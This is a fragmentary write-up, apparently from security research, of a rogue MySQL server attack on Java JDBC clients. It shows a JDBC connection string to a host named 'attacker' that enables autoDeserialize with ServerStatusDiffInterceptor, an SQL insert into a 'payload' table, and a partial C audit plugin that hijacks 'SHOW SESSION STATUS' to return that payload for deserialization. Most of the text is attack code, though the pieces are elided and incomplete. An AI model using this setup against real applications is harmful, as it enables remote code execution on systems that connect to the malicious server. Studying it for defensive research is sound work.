...
/* jdbc url
jdbc:mysql://user:pass@attacker/codeplutos?statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
*/
...
-- ----------------------------
BEGIN;
INSERT INTO `payload` VALUES (0x01, 1);
COMMIT;
                         ...
                         const void *event)
{
  if (event_class == MYSQL_AUDIT_PARSE_CLASS)
  {
    ...
    if (event_parse->event_subclass == MYSQL_AUDIT_PARSE_PREPARSE)
    {
      ...
      if (strcasecmp(std::string(event_parse->query.str).c_str(),"SHOW SESSION STATUS")==0)
      {
        char sql[] = "select `ITEM1`, `ITEM2` from codeplutos.payload";
